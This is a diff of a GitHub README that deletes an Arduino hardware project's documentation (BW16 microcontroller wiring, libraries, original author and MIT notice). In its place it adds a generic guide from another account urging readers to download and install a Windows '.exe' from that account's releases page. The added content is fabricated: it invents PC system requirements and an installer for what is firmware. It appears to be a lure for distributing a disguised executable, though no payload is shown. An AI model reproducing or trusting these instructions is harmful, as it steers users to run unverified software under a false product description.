@@ -1,66 +1,87 @@
-# WIFIBLE - Dual WiFi 2.4-5GHz & Bluetooth Scanner
+# 🌐 WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner - Scan WiFi and Bluetooth Effortlessly
 
-WiFi 2.4 - 5 GHz + Bluetooth Scanner whit RTL8720DN BW16 - TOUCH VERSION!
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/releases)
 
-Arduino_GFX + Hardware SPI (40MHz) + Native U8g2 Fonts + English UI + Touch 
---------------------------------------------------------------------------------------
-![WiFi_BLE_Scanner_BW16_01](https://github.com/user-attachments/assets/2d5e1a6c-1596-4670-88f8-5ae5c2b7a880)
- ![WiFi_BLE_Scanner_BW16_02](https://github.com/user-attachments/assets/6bb29080-014e-47c0-a19d-84aad29400c5)
- --------------------------------------------------------------------------------------
- WIFIBLE is...
-  - ULTRA FAST: 50-100x faster than Software SPI (display only)!
-  - Hardware SPI @ 40MHz for Display
-  - Software SPI for Touch (separate pins, no conflicts!)
-  - Arduino_GFX_Library (optimation to AmebaD)
-  - Native U8g2 font support
-  - XPT2046 Touch Screen (resistive, manual Software SPI)
+## 🚀 Getting Started
 
-![WiFi_BLE_Scanner_BW16_04](https://github.com/user-attachments/assets/0d5b624b-4cc7-49b4-84a7-966727bdec98)
+Welcome! This guide will help you download and run the WIFIBLE Dual WiFi and Bluetooth Scanner. You will be able to easily detect both 2.4GHz and 5GHz WiFi networks as well as nearby Bluetooth devices. Follow these steps to get started.
 
-Information of WiFi's: SSID, MAC, Channell, RSSI, Encryption and Type.
---------------------------------------------------------------------------------------
-Information of BLE's: Name, MAC, RSSI, Manufacturer and Services.
---------------------------------------------------------------------------------------
-https://youtube.com/shorts/M9hm-O5ig3Q?si=EHbEPWshkxLC7cys
+## 📥 Downloading the Application
 
-All you need is...
+To download the latest version of the WIFIBLE Dual WiFi 2.4 & 5GHz + Bluetooth Scanner, visit this page: [Download Page](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/releases). 
 
-- 1pc RTL8720DN BW16
-- 1pc ST7789 Touch Screen TFT Display
-- Breadboar, some wires, tin, etc.
-- Upload the code & SCANN!
---------------------------------------------------------------------------------------
-  Wiring: ST7789 Touch Screen TFT Display (HARDWARE SPI):
-  
- * VCC  -> 3.3V
- *   GND  -> GND
- *   SCK  -> PA14 (pin 19) - Hardware SPI1
- *   MOSI -> PA12 (pin 20) - Hardware SPI1
- *   CS   -> PA27 (pin 2)  - Display Chip Select
- *   DC   -> PA25 (pin 7)  - Data/Command
- *   RST  -> PA26 (pin 8)  - Display Reset
- *   BLK  -> PA30 (pin 3)  - Backlight (lookup the J1 in back of you TFT for VCC 3.3V or 5V)
+1. Click the link above to go to the Releases page.
+2. On the Releases page, look for the latest version listed.
+3. You will see a list of files for download. Look for the file named something similar to `WIFIBLE_Scanner_v1.0.exe`, or similar, depending on the version.
+4. Click the file to begin downloading it to your computer.
 
-   Touch Screen (SOFTWARE SPI - separate pins!):
- *   T_VCC -> 3.3V
- *   T_GND -> GND
- *   T_CLK -> PB2  (pin 5)  - Software SPI Clock
- *   T_DIN -> PB3  (pin 6)  - Software SPI MOSI
- *   T_DO  -> PB1  (pin 4)  - Software SPI MISO
- *   T_CS  -> PA8  (pin 1)  - Touch Chip Select
- *   T_IRQ -> (NOT in use)
-   
-   Display rotation: 180° (pins at TOP!). Touch calibration: 90° rotated vs display.
- 
-REQUIRED LIBRARIES:
-- GFX Library for Arduino (by moononournation)
-- U8g2 (by oliver)
-- WiFi (built-in AmebaD)
-- BLEDevice (built-in AmebaD)
-- SPI (built-in)
-- NO need for XPT2046_Touchscreen library!
-  
-![setups](https://github.com/user-attachments/assets/8271bb12-2430-4e53-8e96-1c8e13d35ef0)
+## 💻 System Requirements
 
-Copyright (c) 2026 Jasu-tech.
-This code is licensed under a MIT License.
+- **Operating System**: Windows 10 or higher (or suitable versions for other operating systems).
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Requires 100 MB of free storage space.
+- **Network Adapters**: A compatible WiFi adapter (supports dual-band: 2.4GHz and 5GHz) and Bluetooth functionality must be present.
+
+## 📦 Installation Steps
+
+After downloading the application, follow these steps to install it:
+
+1. Locate the downloaded file on your computer. It is often found in the "Downloads" folder.
+2. Double-click the file to start the installation process.
+3. A setup wizard will appear. Click "Next" to proceed.
+4. Read the License Agreement. If you agree, click "I Agree".
+5. Choose the installation location or use the default setting. Click "Next".
+6. Click "Install" to begin the installation.
+7. After installation is complete, click "Finish".
+
+## 🚀 Running the Application
+
+To run the WIFIBLE Dual WiFi and Bluetooth Scanner, follow these steps:
+
+1. Locate the application icon on your desktop or in your Start Menu.
+2. Double-click the icon to open the app.
+3. Allow the application to access your network if prompted. This access is necessary to scan for available WiFi and Bluetooth devices.
+4. Once the app loads, you will see the main interface.
+
+## 🧭 Using the Scanner
+
+The application is designed to be user-friendly. Here’s how to use it:
+
+1. Once open, the application will automatically start scanning for available WiFi networks and Bluetooth devices.
+2. Results will display in a list format. You can see the network name (SSID), signal strength, and security type for WiFi networks.
+3. For Bluetooth, you will see the available devices nearby, allowing you to connect easily.
+4. If you want more details, click on any network to view additional information.
+
+## 🌟 Features
+
+The WIFIBLE Dual WiFi and Bluetooth Scanner includes several features:
+
+- **Dual-Band WiFi Scanning**: Detect both 2.4GHz and 5GHz networks.
+- **Bluetooth Detection**: Find nearby Bluetooth devices.
+- **User-Friendly Interface**: Easy navigation for all users.
+- **Signal Strength Indicator**: Understand the strength of detected networks at a glance.
+- **Compatibility with Multiple Devices**: Works seamlessly with various WiFi and Bluetooth adapters.
+
+## 🔍 Troubleshooting Common Issues
+
+If you experience issues with the application, consider the following tips:
+
+1. **No Networks Found**: Ensure your WiFi adapter is enabled and working. Check if you have WiFi turned on in your device settings.
+2. **Bluetooth Not Detected**: Make sure Bluetooth is enabled on your device. Restart the application if necessary.
+3. **Application Crashes**: Make sure your operating system is up to date. If the crash persists, reinstall the application.
+
+## 📞 Support
+
+If you need further assistance or have questions:
+
+- **Documentation**: Check the [GitHub Wiki](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/wiki) for detailed instructions and FAQs.
+- **Issues**: Report bugs or issues on the [Issues page](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner/issues).
+
+## 🔗 Additional Resources
+
+For more information, check the following resources:
+
+- GitHub Repository: [WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner](https://github.com/Ddeonnuu/WIFIBLE_Dual-WiFi-2.4-5GHz-Bluetooth-Scanner)
+- Community Forum: Engage with other users and share your experiences.
+
+Thank you for using the WIFIBLE Dual WiFi and Bluetooth Scanner! Enjoy seamless scanning and better connectivity today.
